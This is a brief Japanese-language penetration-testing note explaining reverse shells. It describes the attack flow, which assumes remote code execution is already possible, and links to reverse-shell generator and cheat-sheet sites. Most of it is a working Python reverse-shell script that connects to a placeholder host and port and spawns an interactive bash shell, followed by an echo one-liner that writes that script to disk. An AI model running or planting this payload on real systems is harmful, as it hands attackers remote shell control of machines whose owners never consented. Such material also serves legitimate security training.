# Reverse shellとは
攻撃者から攻撃対象へ接続してシェルの操作権を獲得するバインドシェルとは異なり、攻撃対象から攻撃者へ接続してシェルの操作権を獲得する技術。

## 攻撃の流れ
前提: RCEできる状態
1. 攻撃者のサーバーで通信を待ち受ける
2. 攻撃対象のサーバー上でリバースシェルプログラムを実行

## リバースシェル生成ツール
[https://www.revshells.com/]
## リバースシェル参考
[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]

## pythonスクリプトを使用したリバースシェル
```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<ターゲット>', <ポート>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])
```
ワンライナーで書き込み  
`echo 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('<ターゲット>', <ポート>)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/bash", "-i"])' > test.py`
